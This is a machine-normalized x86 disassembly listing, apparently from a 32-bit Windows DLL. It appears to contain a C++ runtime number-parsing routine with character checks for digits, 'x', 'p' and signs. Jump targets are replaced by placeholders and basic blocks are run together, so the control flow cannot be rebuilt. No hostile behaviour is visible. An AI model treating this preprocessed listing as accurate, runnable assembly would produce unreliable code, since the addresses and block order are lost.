jne r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x4c ] 0x1
mov edx [ ebp - 0x84 ]
xor eax eax
push edx
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x68 ] eax
lea eax [ ebp - 0x68 ]
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
push ecx
lea edx [ ebp - 0x5c ]
push edx
mov [ ebp - 0x54 ] 0x78
call sub_10016639
movzx edi [ ebp - 0x5c ]
add esp 0x14
mov esi ebx
call sub_10013700
cmp ax di
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x18 ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_10013d60
test al al
jne r-xdata
cmp [ ebp - 0x64 ] 0x0
jne r-xdata
movzx ecx [ ebx + 0x6 ]
mov eax [ ebp - 0x70 ]
cmp ax cx
ja r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
mov esi ebx
call sub_10013760
jmp r-xdata
mov eax [ ebp - 0x84 ]
push eax
push 0x58
call sub_10005560
add esp 0x8
mov di ax
call sub_10013700
cmp ax di
jne r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ ebp - 0x64 ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x30
inc eax
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x7c ]
cmp ax cx
ja r-xdata
movzx edx ax
mov eax ecx
lea esi [ edx + 0x9 ]
cmp eax esi
jg r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ ebp - 0x6c ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
movzx ecx ax
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x5c ] 0x0
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_10013d60
test al al
jne r-xdata
mov esi ebx
call sub_10013d60
test al al
jne r-xdata
mov ecx [ ebp - 0x6c ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
movzx esi [ ebx + 0x6 ]
call eax
cmp si ax
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x80 ] cx
ja r-xdata
movzx edx ax
mov eax ecx
lea esi [ edx + 0x5 ]
cmp eax esi
jle r-xdata
sub eax edx
mov esi eax
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x2c ] 0x0
mov edi [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x2
mov esi ebx
mov [ ebp - 0x68 ] 0x0
call sub_10013d60
test al al
jne r-xdata
cmp [ ebp - 0x4c ] 0x0
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x74 ] 0x0
jge r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
call sub_1001766d
mov ecx [ eax ]
mov eax [ ebp - 0x58 ]
mov dl [ ecx ]
mov [ eax ] dl
mov ecx [ ebx ]
inc eax
mov [ ebp - 0x58 ] eax
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
movzx edx [ ebp - 0x80 ]
mov eax ecx
lea ecx [ edx + 0x5 ]
cmp eax ecx
jg r-xdata
sub eax edx
lea esi [ eax + 0xa ]
test esi esi
js r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
cmp [ ebp - 0x50 ] 0x0
mov edi [ ebp - 0x18 ]
jne r-xdata
lea esi [ ebp - 0x48 ]
movzx ecx [ ebx + 0x6 ]
mov eax [ ebp - 0x70 ]
cmp ax cx
ja r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_10013d60
test al al
jne r-xdata
movzx ecx [ ebx + 0x6 ]
mov eax [ ebp - 0x70 ]
cmp ax cx
ja r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x30
inc eax
inc [ ebp - 0x74 ]
mov [ ebp - 0x58 ] eax
mov dx [ ebp - 0x70 ]
cmp [ ebx + 0x6 ] dx
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov edi [ ebp - 0x64 ]
cmp edi 0x24
jl r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebp - 0x4 ] 0x1
cmp edi 0x10
jb r-xdata
mov edx [ ebp - 0x68 ]
mov eax [ ebp - 0x7c ]
cmp ax cx
ja r-xdata
movzx edx ax
mov eax ecx
lea esi [ edx + 0x9 ]
cmp eax esi
jg r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ebp - 0x88 ]
mov [ ebp - 0x58 ] edx
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x7c ]
cmp ax cx
ja r-xdata
movzx edx ax
mov eax ecx
lea esi [ edx + 0x9 ]
cmp eax esi
jg r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ ebx ]
dec [ ebp - 0x74 ]
mov [ ebp - 0x4c ] 0x1
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x74 ]
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_100173b1
add esp 0x4
mov cl [ esi ]
cmp cl 0x7f
je r-xdata
mov eax [ ebp - 0x80 ]
cmp ax cx
ja r-xdata
movzx edx ax
mov eax ecx
lea esi [ edx + 0x5 ]
cmp eax esi
jle r-xdata
sub eax edx
mov edi eax
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x18 ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x48 ]
push eax
call sub_100173b1
add esp 0x4
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x74 ]
mov edx [ ebp - 0x8c ]
mov [ eax ] 0x0
mov [ edx ] ecx
jb r-xdata
mov edi [ ebp - 0x84 ]
movzx esi [ ebx + 0x6 ]
push edi
xor eax eax
lea edx [ ebp - 0x78 ]
push edx
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x78 ] eax
push 0x1
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x6c ]
push ecx
mov [ ebp - 0x54 ] 0x70
call sub_10016639
add esp 0x14
cmp si [ ebp - 0x6c ]
je r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x80 ]
cmp ax cx
ja r-xdata
movzx edx ax
mov eax ecx
lea esi [ edx + 0x5 ]
cmp eax esi
jle r-xdata
sub eax edx
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov dx [ ebp - 0x70 ]
cmp [ ebx + 0x6 ] dx
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov ecx [ ebx ]
mov [ ebp - 0x4c ] 0x1
test ecx ecx
je r-xdata
dec edx
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
movzx edx ax
mov eax ecx
lea ecx [ edx + 0x5 ]
cmp eax ecx
jg r-xdata
sub eax edx
lea edi [ eax + 0xa ]
test edi edi
js r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x70
mov ecx [ ebx ]
inc eax
mov [ ebp - 0x58 ] eax
test ecx ecx
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
movzx edx ax
mov eax ecx
lea ecx [ edx + 0x5 ]
cmp eax ecx
jg r-xdata
sub eax edx
add eax 0xa
test eax eax
js r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov eax [ ebp - 0x58 ]
mov cl [ esi + r--data ]
mov [ eax ] cl
inc eax
inc edi
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x64 ] edi
test edi edi
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov edx [ ecx + 0x20 ]
cmp [ edx ] 0x0
je r-xdata
test edx edx
jne r-xdata
mov eax [ ebp - 0x2c ]
cmp edi 0x10
jae r-xdata
mov ecx [ ebp - 0x68 ]
cmp [ eax + ecx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x64 ] 0x24
mov [ ebp - 0x4c ] 0x1
jl r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov edx [ ecx + 0x20 ]
cmp [ edx ] 0x0
je r-xdata
movzx esi [ ebx + 0x6 ]
push edi
xor eax eax
lea edx [ ebp - 0x78 ]
push edx
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x78 ] eax
push 0x1
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x6c ]
push ecx
mov [ ebp - 0x54 ] 0x50
call sub_10016639
add esp 0x14
cmp si [ ebp - 0x6c ]
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
cmp [ ebp - 0x64 ] 0x24
jge r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov eax [ ecx + 0x30 ]
cmp [ eax ] 0x0
jle r-xdata
cmp [ esi + 0x1 ] 0x0
jle r-xdata
mov eax [ ebp - 0x2c ]
cmp edi 0x10
jae r-xdata
cmp cl [ eax + edx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x68 ] 0x0
je r-xdata
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov esi ebx
call sub_10013700
cmp ax [ ebp - 0x70 ]
jne r-xdata
inc [ ebp - 0x74 ]
jmp r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_10013d60
test al al
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov eax [ ecx + 0x30 ]
cmp [ eax ] 0x0
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov ecx [ ebx ]
mov [ ebp - 0x4c ] 0x1
test ecx ecx
je r-xdata
mov dl [ eax + r--data ]
mov eax [ ebp - 0x58 ]
mov [ eax ] dl
inc eax
inc [ ebp - 0x64 ]
mov [ ebp - 0x58 ] eax
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_10013d60
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
test edx edx
je r-xdata
inc esi
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x50 ] 0x1
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov esi ebx
call sub_10013700
cmp ax [ ebp - 0x5c ]
jne r-xdata
mov eax [ ebp - 0x58 ]
mov dl [ edi + r--data ]
mov [ eax ] dl
inc eax
inc [ ebp - 0x64 ]
mov [ ebp - 0x58 ] eax
cmp [ ebp - 0x64 ] 0x0
je r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x2c ]
cmp edx 0x10
jae r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_10013d60
test al al
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov edi [ ebp - 0x84 ]
movzx esi [ ebx + 0x6 ]
push edi
xor eax eax
lea edx [ ebp - 0x78 ]
push edx
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x78 ] eax
push 0x1
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x6c ]
push ecx
mov [ ebp - 0x54 ] 0x2b
call sub_10016639
add esp 0x14
cmp si [ ebp - 0x6c ]
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_10013d60
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov edx [ ebp - 0x68 ]
cmp [ eax + edx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
push 0x0
mov ebx 0x1
lea esi [ ebp - 0x2c ]
call sub_10002a00
add [ ebp - 0x68 ] ebx
mov ebx [ ebp - 0x78 ]
mov ecx [ ebp - 0x68 ]
cmp [ eax + ecx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov edi edi
mov dx [ ebp - 0x70 ]
cmp [ ebx + 0x6 ] dx
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x2b
mov ecx [ ebx ]
inc eax
mov [ ebp - 0x58 ] eax
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x64 ] 0x0
call sub_10013d60
test al al
jne r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebp - 0x50 ] 0x1
inc [ ebp - 0x68 ]
jmp r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov edx [ ecx + 0x20 ]
cmp [ edx ] 0x0
je r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x2c ]
cmp edx 0x10
jae r-xdata
mov dx [ ebp - 0x70 ]
cmp dx [ ebx + 0x6 ]
ja r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x4c ] 0x0
je r-xdata
mov ecx [ ebx ]
mov [ ebp - 0x4c ] 0x1
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
movzx esi [ ebx + 0x6 ]
push edi
xor eax eax
lea edx [ ebp - 0x78 ]
push edx
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x78 ] eax
push 0x1
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x6c ]
push ecx
mov [ ebp - 0x54 ] 0x2d
call sub_10016639
add esp 0x14
cmp si [ ebp - 0x6c ]
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov [ ebx + 0x4 ] 0x1
mov [ ebx ] 0x0
mov edx [ ecx + 0x20 ]
cmp [ edx ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov eax [ ecx + 0x30 ]
cmp [ eax ] 0x0
jle r-xdata
inc [ eax + ecx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x30
inc eax
mov [ ebp - 0x58 ] eax
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x2d
mov ecx [ ebx ]
inc eax
mov [ ebp - 0x58 ] eax
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov eax [ ecx + 0x30 ]
cmp [ eax ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_10013d60
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
movzx edx [ ebp - 0x70 ]
movzx eax [ ebx + 0x6 ]
add edx 0x9
cmp eax edx
jg r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov edx [ ecx + 0x20 ]
cmp [ edx ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_10013d60
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ ebp - 0x64 ] 0x8
jge r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov eax [ ecx + 0x30 ]
cmp [ eax ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov ecx [ ebx ]
mov [ ebp - 0x4c ] 0x1
test ecx ecx
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_10013d60
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov dl [ ebx + 0x6 ]
sub dl [ ebp - 0x70 ]
mov eax [ ebp - 0x58 ]
add dl 0x30
mov [ eax ] dl
inc eax
inc [ ebp - 0x64 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_10013d60
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_10013700
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ax [ esi + 0x6 ]
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ esi + 0x6 ] ax
mov [ esi + 0x4 ] 0x1
retn
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_10013760
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
mov eax esi
retn
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ esi + 0x4 ] 0x0
mov eax esi
retn
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_100137c0
push ebp
mov ebp esp
cmp edi 0xffffffff
jne r-xdata
cmp edi 0xfffffffe
jbe r-xdata
push r--data
call sub_10015cff
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_10015cff
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_100024e0
test edi edi
je r-xdata
cmp edi 0x1
jne r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
mov eax esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
